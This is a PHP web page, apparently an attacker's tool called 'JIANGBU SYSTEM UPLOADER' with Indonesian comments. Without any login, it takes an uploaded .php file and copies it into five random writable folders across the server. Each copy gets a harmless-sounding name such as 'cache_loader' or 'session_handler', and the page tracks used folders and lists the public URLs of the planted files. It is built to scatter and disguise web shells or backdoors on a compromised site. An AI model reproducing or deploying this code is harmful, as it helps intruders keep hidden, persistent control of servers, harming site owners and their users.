<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// ========== KONFIGURASI ==========
$allowed_ext = "php";
$max_upload = 5;
$max_file_size = 10 * 1024 * 1024;
$history_file = __DIR__ . '/.folder_history.json';

// ========== CUSTOM NAMES (DARI ANDA) ==========
$system_names = [
    'adm_core', 'admin_gate', 'syspanel', 'auth_root', 'controlnode', 'managehub', 'backend_access',
    'securepanel', 'cp_master', 'dashboard_core', 'root_manage', 'panelbridge', 'adminx', 'access_center',
    'control_access', 'sys_admin', 'hiddenpanel', 'manageroot', 'core_login', 'internal_access',
    'config_core', 'session_handler', 'cache_loader', 'data_sync', 'init_server', 'service_core',
    'api_bridge', 'system_loader', 'runtime_init', 'module_handler', 'sys_gateway', 'admin_runtime',
    'auth_manager', 'panel_service', 'gateway_admin', 'server_access', 'secure_auth', 'private_core',
    'root_gateway', 'admin_bridge', 'kernel_admin', 'master_access', 'sys_root', 'cpanel_core',
    'backend_node', 'system_auth', 'admin_service', 'access_kernel', 'hidden_core', 'secure_gateway',
    'core_adminx', 'runtime_core', 'api_manager', 'sys_loader', 'gateway_root', 'access_node',
    'control_kernel', 'manage_core', 'private_access', 'server_core', 'adminhandler', 'rootpanel',
    'systempanel', 'admin_proxy', 'node_access', 'internal_core', 'syscontrol', 'backend_root',
    'service_admin', 'hidden_access', 'panelnode', 'master_gateway', 'authbridge', 'admin_kernel',
    'cp_access', 'system_runtime', 'core_gateway', 'panel_runtime', 'secure_root', 'admin_loader',
    'gateway_core', 'private_gateway', 'root_loader', 'access_runtime', 'sysmanager', 'control_runtime',
    'server_gateway', 'runtime_access', 'hidden_gateway', 'backend_loader', 'kernel_root', 'admin_center',
    'system_access', 'private_runtime', 'secure_loader', 'master_runtime', 'node_gateway', 'sys_bridge',
    'core_access', 'admin_runtimex', 'gateway_handler', 'internal_gateway'
];

$system_names = array_unique($system_names);
$total_names = count($system_names);

// ========== SCAN SEMUA FOLDER YANG SUDAH ADA ==========
function scan_all_folders($dir, $depth = 0, &$result = [], $max_depth = 15) {
    if ($depth > $max_depth) return;
    $items = @scandir($dir);
    if ($items === false) return;
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            $result[] = [
                'path' => $path,
                'name' => $item,
                'depth' => $depth + 1
            ];
            scan_all_folders($path, $depth + 1, $result, $max_depth);
        }
    }
}

// Ambil SEMUA folder dari direktori saat ini
$all_folders = [];
scan_all_folders(__DIR__, 0, $all_folders, 15);

// Filter folder yang bisa ditulisi
$valid_folders = [];
foreach ($all_folders as $folder) {
    if (is_writable($folder['path'])) {
        $valid_folders[] = $folder;
    }
}

// Kalau ga ada folder valid, kasih error
if (empty($valid_folders)) {
    die('<div style="color:red; background:#1a1f4e; padding:20px; border-radius:12px;">❌ TIDAK ADA FOLDER YANG BISA DITULISI! Pastikan permission folder benar.</div>');
}

// ========== HISTORY MANAGEMENT ==========
function get_folder_history() {
    global $history_file;
    if (file_exists($history_file)) {
        $data = json_decode(file_get_contents($history_file), true);
        return is_array($data) ? $data : [];
    }
    return [];
}

function save_folder_history($history) {
    global $history_file;
    file_put_contents($history_file, json_encode($history));
}

$folder_history = get_folder_history();

// Filter folder yang belum pernah dipakai
$available_folders = [];
foreach ($valid_folders as $folder) {
    if (!in_array($folder['path'], $folder_history)) {
        $available_folders[] = $folder;
    }
}

// Reset otomatis jika kurang dari max_upload
if (count($available_folders) < $max_upload) {
    $available_folders = $valid_folders;
    $folder_history = [];
    save_folder_history($folder_history);
}

// ========== GENERATE NAMA SYSTEM ==========
function generate_system_name($names, $seed = 0) {
    $index = (time() + getmypid() + $seed + mt_rand(1, 99999)) % count($names);
    return $names[$index];
}

// ========== PROSES UPLOAD ==========
$messages = [];
$upload_results = [];

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_upload'])) {
    $file = $_FILES['file_upload'];
    $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if ($file_ext !== $allowed_ext) {
        $messages[] = ['type' => 'error', 'text' => '❌ Hanya file .php yang diperbolehkan!'];
    } elseif ($file['size'] > $max_file_size) {
        $messages[] = ['type' => 'error', 'text' => '❌ Maksimal ukuran file 10MB!'];
    } elseif ($file['error'] !== UPLOAD_ERR_OK) {
        $messages[] = ['type' => 'error', 'text' => '❌ Gagal upload file!'];
    } else {
        // Acak dan pilih folder
        shuffle($available_folders);
        $selected_folders = array_slice($available_folders, 0, $max_upload);
        $success_count = 0;
        $newly_used = [];
        $used_names = [];
        
        foreach ($selected_folders as $idx => $folder) {
            // Generate nama system unique
            $base_name = generate_system_name($system_names, $idx);
            $counter = 0;
            while (in_array($base_name, $used_names)) {
                $base_name = generate_system_name($system_names, $idx + $counter + 100);
                $counter++;
            }
            $used_names[] = $base_name;
            
            $filename = $base_name . '.php';
            $destination = $folder['path'] . '/' . $filename;
            
            // Handle duplikat file
            $dup = 1;
            while (file_exists($destination)) {
                $filename = $base_name . '_' . $dup . '.php';
                $destination = $folder['path'] . '/' . $filename;
                $dup++;
            }
            
            // Upload
            if (copy($file['tmp_name'], $destination)) {
                $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on' ? 'https://' : 'http://';
                $domain = $protocol . $_SERVER['HTTP_HOST'];
                $relative = str_replace($_SERVER['DOCUMENT_ROOT'], '', $destination);
                $relative = str_replace('\\', '/', $relative);
                $full_link = $domain . $relative;
                
                $depth_label = $folder['depth'] == 1 ? '📁 Root' : '📂 Level ' . $folder['depth'];
                
                $upload_results[] = [
                    'no' => $idx + 1,
                    'folder_name' => $folder['name'],
                    'folder_path' => $folder['path'],
                    'depth' => $depth_label,
                    'filename' => $filename,
                    'link' => $full_link
                ];
                
                $newly_used[] = $folder['path'];
                $success_count++;
            }
        }
        
        // Update history
        if (!empty($newly_used)) {
            save_folder_history(array_merge($folder_history, $newly_used));
            $messages[] = ['type' => 'success', 'text' => "✅ BERHASIL! Upload ke {$success_count} folder dengan NAMA CUSTOM!"];
            $messages[] = ['type' => 'info', 'text' => "📝 Nama-nama yang digunakan: " . implode(', ', array_slice($used_names, 0, 10)) . (count($used_names) > 10 ? '...' : '')];
        }
        
        @unlink($file['tmp_name']);
    }
}

// Reset history
if (isset($_GET['reset'])) {
    save_folder_history([]);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

$total_folders = count($valid_folders);
$used_count = count($folder_history);
$available_count = count($available_folders);

// Contoh nama system
$sample_names = [];
for ($i = 0; $i < min(12, $total_names); $i++) {
    $sample_names[] = generate_system_name($system_names, $i) . '.php';
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Uploader - Custom Names</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0e27;font-family: 'Courier New', 'Fira Code', monospace;
            padding: 40px 20px;
            min-height: 100vh;
        }
        .container { max-width: 1300px; margin: 0 auto; }
        
        /* Terminal Style */
        .terminal {
            background: #0f1235;
            border: 1px solid #2a2f6e;
            border-radius: 16px;
            margin-bottom: 24px;
            overflow: hidden;
        }
        .terminal-header {
            background: #1a1f4e;
            padding: 12px 20px;
            border-bottom: 1px solid #2a2f6e;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }
        .dot-red { background: #ff5f56; }
        .dot-yellow { background: #ffbd2e; }
        .dot-green { background: #27c93f; }
        .terminal-title {
            color: #8b92d6;
            font-size: 0.75rem;
            margin-left: 10px;
        }
        .terminal-body { padding: 28px; }
        
        h1 {
            color: #c084fc;
            font-size: 1.5rem;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #6b72b3;
            margin-bottom: 24px;
            font-size: 0.8rem;
        }
        
        /* Stats */
        .stats {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 24px;
        }
        .stat {
            background: #1a1f4e;
            padding: 6px 18px;
            border-radius: 30px;
            font-size: 0.75rem;
            color: #a5b4fc;
        }
        .stat strong { color: #c084fc; }
        
        /* Sample Names */
        .sample-box {
            background: #080b24;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
        }
        .sample-title {
            color: #c084fc;
            margin-bottom: 12px;
            font-size: 0.8rem;
        }
        .sample-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .tag {
            background: #1a1f4e;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.7rem;
            color: #a5b4fc;
        }
        
        /* Messages */
        .msg {
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 0.8rem;
        }
        .msg-success {
            background: #064e3b;
            border-left: 3px solid #10b981;
            color: #a7f3d0;
        }
        .msg-error {
            background: #7f1d1d;
            border-left: 3px solid #ef4444;
            color: #fecaca;
        }
        .msg-info {
            background: #1e3a5f;
            border-left: 3px solid #3b82f6;
            color: #bfdbfe;
        }
        
        /* Upload Area */
        .upload-area {
            border: 2px dashed #2a2f6e;
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 20px;
        }
        .upload-area:hover {
            border-color: #c084fc;
            background: #0c1033;
        }
        .upload-icon { font-size: 40px; margin-bottom: 10px; }
        #fileNameDisplay { color: #8b92d6; font-size: 0.8rem; }
        input[type="file"] { display: none; }
        
        button {
            background: linear-gradient(135deg, #7c3aed, #4f46e5);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 40px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(124,58,237,0.3); }
        
        .btn-reset {
            background: #7f1d1d;
            width: auto;
            padding: 8px 20px;
            font-size: 0.75rem;
        }
        .btn-copy {
            background: #1a1f4e;
            width: auto;
            padding: 8px 20px;
            font-size: 0.7rem;
        }
        
        /* Results */
        .results-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            margin-bottom: 20px;
        }
        .results-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
            gap: 12px;
            max-height: 600px;
            overflow-y: auto;
            padding: 4px;
        }
        .result-card {
            background: #080b24;
            border-radius: 12px;
            padding: 16px;
            border-left: 3px solid #c084fc;
            transition: all 0.2s;
        }
        .result-card:hover {
            background: #0c1033;
            transform: translateX(4px);
        }
        .result-badge {
            background: #1a1f4e;
            display: inline-block;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 0.6rem;
            color: #a5b4fc;
            margin-bottom: 10px;
        }
        .result-folder {
            color: #c084fc;
            font-weight: 600;
            margin-bottom: 6px;
        }
        .result-depth {
            font-size: 0.65rem;
            color: #6b72b3;
            margin-bottom: 8px;
        }
        .result-filename {
            background: #1a1f4e;
            padding: 6px 10px;
            border-radius: 8px;
            font-size: 0.7rem;
            color: #4ade80;
            margin: 10px 0;
            word-break: break-all;
        }
        .result-link {
            font-size: 0.7rem;
            word-break: break-all;
            margin: 8px 0;
        }
        .result-link a {
            color: #60a5fa;
            text-decoration: none;
        }
        .result-link a:hover { text-decoration: underline; }
        
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: #1a1f4e;
            border: 1px solid #c084fc;
            color: #a5b4fc;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 0.8rem;
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        hr { margin: 20px 0; border: none; border-top: 1px solid #2a2f6e; }
        .text-center { text-align: center; }
        .big-number { font-size: 2rem; color: #c084fc; font-weight: bold; }
        .text-muted { color: #6b72b3; font-size: 0.7rem; }
        .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
    </style>
</head>
<body>
<div class="container">
    <!-- Main Terminal -->
    <div class="terminal">
        <div class="terminal-header">
            <div class="dot dot-red"></div>
            <div class="dot dot-yellow"></div>
            <div class="dot dot-green"></div>
            <div class="terminal-title">system_uploader@server:~</div>
        </div>
        <div class="terminal-body">
            <h1>⚡ BY JIANGBU SYSTEM UPLOADER</h1>
            <div class="subtitle">Upload 1 file .php → distribusi ke <?= $max_upload ?> folder RANDOM dengan NAMA CUSTOM</div>
            
            <div class="stats">
                <span class="stat">📁 Total folder: <strong><?= $total_folders ?></strong></span>
                <span class="stat">📌 Sudah dipakai: <strong><?= $used_count ?></strong></span>
                <span class="stat">🆓 Tersedia: <strong><?= $available_count ?></strong></span>
                <span class="stat">🎲 Kamus nama: <strong><?= number_format($total_names) ?></strong></span>
            </div>
            
            <?php if ($used_count > 0): ?>
            <div class="flex-between" style="margin-bottom: 20px;">
                <span style="color:#6b72b3; font-size:0.7rem;">💡 Folder yang sudah dipakai tidak akan terpilih lagi</span>
                <a href="?reset=1" onclick="return confirm('Reset history folder?')" style="background:#7f1d1d; color:white; padding:6px 16px; border-radius:30px; text-decoration:none; font-size:0.7rem;">↺ RESET HISTORY</a>
            </div>
            <?php endif; ?>
            
            <!-- Sample System Names -->
            <div class="sample-box">
                <div class="sample-title">📝 Contoh nama custom (<?= number_format($total_names) ?> total):</div>
                <div class="sample-tags">
                    <?php foreach ($sample_names as $s): ?>
                    <span class="tag"><?= htmlspecialchars($s) ?></span>
                    <?php endforeach; ?>
                    <span class="tag">+<?= number_format($total_names - 12) ?> more</span>
                </div>
            </div>
            
            <!-- Messages -->
            <?php foreach ($messages as $msg): ?>
            <div class="msg msg-<?= $msg['type'] ?>"><?= htmlspecialchars($msg['text']) ?></div>
            <?php endforeach; ?>
            
            <!-- Upload Form -->
            <form method="post" enctype="multipart/form-data" id="uploadForm">
                <div class="upload-area" onclick="document.getElementById('fileInput').click()">
                    <div class="upload-icon">📎</div>
                    <div id="fileNameDisplay">$ select --file .php</div>
                    <input type="file" name="file_upload" id="fileInput" accept=".php">
                </div>
                <button type="submit">🚀 $ upload --to <?= $max_upload ?> --folders --custom-names</button>
            </form>
        </div>
    </div>
    
    <!-- Results -->
    <?php if (!empty($upload_results)): ?>
    <div class="terminal">
        <div class="terminal-header">
            <div class="dot dot-red"></div>
            <div class="dot dot-yellow"></div>
            <div class="dot dot-green"></div>
            <div class="terminal-title">upload_results@system:~</div>
        </div>
        <div class="terminal-body">
            <div class="results-header">
                <span style="color:#c084fc;">📋 OUTPUT: <?= count($upload_results) ?> files deployed</span>
                <button onclick="copyAllLinks()" class="btn-copy">📋 COPY ALL URLS</button>
            </div>
            
            <div class="results-grid">
                <?php foreach ($upload_results as $res): ?>
                <div class="result-card" data-link="<?= htmlspecialchars($res['link']) ?>">
                    <div class="result-badge">#<?= $res['no'] ?> • <?= $res['depth'] ?></div>
                    <div class="result-folder">📂 <?= htmlspecialchars($res['folder_name']) ?></div>
                    <div class="result-depth">📍 <?= htmlspecialchars($res['folder_path']) ?></div>
                    <div class="result-filename">📄 <?= htmlspecialchars($res['filename']) ?></div>
                    <div class="result-link">🔗 <a href="<?= htmlspecialchars($res['link']) ?>" target="_blank"><?= htmlspecialchars($res['link']) ?></a></div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Info -->
    <div class="terminal">
        <div class="terminal-body text-center">
            <div class="big-number"><?= number_format($total_names) ?></div>
            <div class="text-muted">CUSTOM NAMES</div>
            <hr>
            <div class="text-muted">
                ✨ Nama file menggunakan custom list (adm_core, admin_gate, syspanel, dll)<br>
                📌 Folder yang sudah dipakai akan DISIMPAN HISTORY dan tidak terpilih lagi di upload berikutnya
            </div>
        </div>
    </div>
</div>

<script>
    const fileInput = document.getElementById('fileInput');
    const fileNameDisplay = document.getElementById('fileNameDisplay');
    
    fileInput.addEventListener('change', function() {
        if (this.files.length > 0) {
            fileNameDisplay.innerHTML = `📄 ${this.files[0].name} (${(this.files[0].size / 1024).toFixed(1)} KB)`;
            fileNameDisplay.style.color = '#4ade80';
        } else {
            fileNameDisplay.innerHTML = '$ select --file .php';
            fileNameDisplay.style.color = '#8b92d6';
        }
    });
    
    function showToast(msg) {
        let toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerHTML = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2500);
    }
    
    function copyAllLinks() {
        let links = [];
        let cards = document.querySelectorAll('.result-card');
        for (let i = 0; i < cards.length; i++) {
            let link = cards[i].getAttribute('data-link');
            if (link) links.push(link);
        }
        if (links.length === 0) {
            showToast('⚠️ Tidak ada link');
            return;
        }
        
        let text = links.join('\n');
        navigator.clipboard.writeText(text).then(() => {
            showToast(`✅ ${links.length} link disalin`);
        }).catch(() => {
            let ta = document.createElement('textarea');
            ta.value = text;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            showToast(`✅ ${links.length} link disalin`);
        });
    }
    
    document.getElementById('uploadForm').addEventListener('submit', function(e) {
        if (!fileInput.files || fileInput.files.length === 0) {
            e.preventDefault();
            showToast('❌ Pilih file dulu!');
            return;
        }
        let file = fileInput.files[0];
        if (!file.name.toLowerCase().endsWith('.php')) {
            e.preventDefault();
            showToast('❌ Hanya file .php yang diperbolehkan!');
            fileInput.value = '';
            fileNameDisplay.innerHTML = '$ select --file .php';
            return;
        }
        if (file.size > 10 * 1024 * 1024) {
            e.preventDefault();
            showToast('❌ Maksimal ukuran 10MB!');
            fileInput.value = '';
            fileNameDisplay.innerHTML = '$ select --file .php';
            return;
        }
        showToast('⏳ Uploading ke <?= $max_upload ?> folders...');
    });
</script>
</body>
</html>
